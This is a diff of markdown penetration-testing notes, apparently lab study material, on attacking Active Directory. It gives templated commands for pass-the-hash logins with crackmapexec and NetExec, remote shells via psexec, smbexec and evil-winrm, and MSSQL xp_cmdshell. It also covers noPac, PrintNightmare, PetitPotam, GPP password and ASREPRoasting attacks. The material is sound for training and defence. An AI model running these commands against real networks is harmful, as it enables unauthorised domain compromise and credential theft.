@@ -12,7 +12,48 @@ as the following edges exist to show us what types of remote[[9-Stacking The Dec
 - [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
 - [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
 - [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)
+## scan services & login
+**scan this services:**
+```bash
+nmap -p 3389,5985,5986,445,1433 <target-ip> -sV -Pn
+```
+**login to the domain computers** 
+```bash
+# windows
+# --- Method 1: Run as domain user directly (on Windows domain-joined machine)
+runas /user:<DOMAIN>\<USER> cmd          # Opens a new CMD as <USER>, will ask for <PASSWORD>
+powershell                              # From inside CMD, launch PowerShell as <USER>
 
+# --- Method 2: WinRM:  Run with PSCredential (inside PowerShell)
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force   # Store password securely
+$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)  
+Enter-PSSession -ComputerName <TARGET> -Credential $Cred    # Remote session as <USER>
+
+# --- Method 3: Runas with /netonly (if machine is not domain-joined)
+runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only for network access
+--------------------------------------------
+# linux
+# with crackmapexec
+# domain
+  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami # auto detect the domain
+# local   
+  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami--local-auth
+  
+# with NetExec
+# domain
+  nxc <smb/winrm/mssql/rdp/wmi> <SUBNET> -u <USER> -p 'P@ssw0rd' -x whoami -d <DOMAIN>
+# lcoal 
+nxc smb <SUBNET> -u UserNAme -p 'PASSWORDHERE' -x whoami --local-auth
+nxc smb <SUBNET> -u '' -p '' --local-auth
+nxc smb <SUBNET> -u UserNAme -H 'LM:NT' -x whoami --local-auth
+nxc smb <SUBNET> -u UserNAme -H 'NTHASH' -x whoami --local-auth
+
+# psexec (get shell)
+psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.DOMIAN.LOCAL> -target-ip <Computer-Target-IP>
+
+# Evil-WinRM
+evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'  # Remote shell as <USER>
+```
 ## Check Local Admin Rights for Domain Users
 **In BloodHound, click on Domain Users object >> Analysis Tab >> run “Find computers where group has local admin rights”  Queries  → view results.**
 
@@ -29,6 +70,15 @@ cat /etc/krb5.conf
 #     INLANEFREIGHT.HTB = {
 #        kdc = dc01.inlanefreight.htb 
 
+cat /etc/hosts
+
+# psexec:
+psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.COMPUTER.LOCAL> -target-ip <TARGTE-COMPUTER-IP>
+
+# with smbsec
+smbexec.py <DOMAIN.LOCAL>/<USER>@<DC01.COMPUTER.LOCAL> -target-ip <TARGTE-COMPUTER-IP>
+
+# with tgt ticket
 impacket-smbexec -k -no-pass administrator@COMPUTER-DC.LOCAL -dc-ip <DC-IP> -target-ip <COMPUTER-DC-IP>
  
 impacket-psexec -k -no-pass administrator@COMPUTER-DC.LOCAL -dc-ip <DC-IP> -target-ip <COMPUTER-DC-IP>
@@ -133,7 +183,7 @@ Get-SQLInstanceDomain
 Import-Module .\PowerUpSQL.ps1
 Get-SQLQuery -Verbose -Instance "<SQL-SERVER-IP>,1433" -username "<DOMAIN>\<USER-2>" -password "NEW-PASS" -query 'Select @@version'
 ```
-#### Connect to MSSQL From
+#### Connect to MSSQL From Linux
 ```bash
 impacket-mssqlclient <DOMAIN>/<USER-2>@<SQL-SERVER-IP> -windows-auth
 enable_xp_cmdshell
@@ -237,7 +287,7 @@ These attacks are advanced and should be tested only in a lab environment. They 
 
 Since cybersecurity changes quickly, we must stay updated, practice new attacks, and keep learning new tools and methods.
 
-## NoPac (SamAccountName Spoofing)
+## 1- NoPac (SamAccountName Spoofing)
 NoPac, also called _Sam_The_Admin_ or _SamAccountName Spoofing_, was released at the end of 2021. It combines two CVEs:
 
 - **CVE-2021-42278 → SAM account name spoofing**  
@@ -288,7 +338,7 @@ sudo python3 noPac.py <DOMIAN.LOCAL>/<USER>:<PASSWORD> -dc-ip <DC-IP>  -dc-host 
 `smbexec.py` runs commands by creating services (e.g., **BTOBTO/BTOBO**) and batch files (`execute.bat`). Each new command creates a temp script that runs, then deletes itself.
 Defender/EDR often blocks this behavior (e.g., flagged as **VirTool:Win32/MSPSEexecCommand**).and Because it’s noisy and easily detected, **smbexec.py** is not good for stealth.
 
-## PrintNightmare
+## 2- PrintNightmare
 PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that **runs on all Windows operating systems**. that **allow for privilege escalation and remote code execution.** ==by  executing a shared file on the attack host==
 **exploit PrintNightmare  allow us to gain a SYSTEM shell session on a Domain Controlle**
 we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit
@@ -331,7 +381,7 @@ C:\Windows\system32>whoami
 ```
 [+]  ==If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.==
 
-## PetitPotam (MS-EFSRPC)
+## 3- PetitPotam (MS-EFSRPC)
 PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
 
 [This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.
@@ -510,7 +560,7 @@ PrivExchange is an attack against Microsoft Exchange Server. A normal domain use
 
 the Exchange server account had special rights in Active Directory (==WriteDACL on the domain==). With those rights, the attacker can change permissions in AD and give their own account **DCSync rights**. DCSync rights allow an account to replicate passwords from the Domain Controller, which means the attacker can ==dump all hashes from Active Directory.== In the end, the attacker can fully compromise the domain and become Domain Admin.
 
-## Printer Bug
+## 3- Printer Bug
 
 - Any domain user can force a Windows server to **authenticate to an attacker-controlled host** by calling `RpcOpenPrinter` and `RpcRemoteFindFirstPrinterChangeNotificationEx` over the spooler’s named pipe (`\\server\pipe\spoolss`).
 - Because the Print Spooler runs as **SYSTEM**, it authenticates with its **machine account credentials**.
@@ -572,7 +622,7 @@ This flag may be:
 
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 ```
-### Credentials in SMB Shares and SYSVOL Scripts
+### 1-Credentials in SMB Shares and SYSVOL Scripts
 The SYSVOL share is accessible to all authenticated users and often contains batch, VBScript, or PowerShell scripts. These may include old or active credentials, making it a valuable spot for password hunting. Always review this directory for sensitive information, like the `reset_local_admin_pass.vbs` script in this example.
 ###### Discovering an Interesting Script:
 ```powershell
@@ -589,7 +639,7 @@ cat \\<DC-HOST-NAME>\SYSVOL\<DOMAIN.LOCAL>\scriptsreset_local_admin_pass.vbs
   crackmapexec smb <TARGETS> -u <USER> -p '<PASS>' --local-auth
   # <TARGETS> = subnet or file containing a list of hosts.
 ```
-### Group Policy Preferences (GPP) Passwords
+### 2- Group Policy Preferences (GPP) Passwords
 When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
 
 - Map drives (drives.xml)
@@ -645,7 +695,7 @@ crackmapexec smb <DC-ip> -u <USER> -p <PASS> -M gpp_password
     - Disabled account or Expired/unused credentials : 
         - password re-use: Perform **==Local/Domain== password spraying** 
     
-### ASREPRoasting
+### 3- ASREPRoasting
 Accounts with **“Do not require Kerberos pre-authentication”** allow anyone to request a TGT. The **AS-REP** from the Domain Controller contains the TGT encrypted with the user’s password. Normally, pre-authentication requires the user to encrypt a timestamp with their password for validation. Without pre-auth, an attacker can capture the AS-REP and perform **offline password cracking** using tools like Hashcat or John the Ripper.
 
 >we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.
@@ -678,7 +728,7 @@ kerbrute userenum -d <domain.local> --dc <DC-IP> /opt/jsmith.txt
 ```
 ######  Using  GetNPUsers Hunting for Users with Kerberos Pre-auth Not Required
 we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool
-### Group Policy Object (GPO) Abuse
+### 3-Group Policy Object (GPO) Abuse
 Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain
 
 GPO misconfigurations can be abused to perform the following attacks:
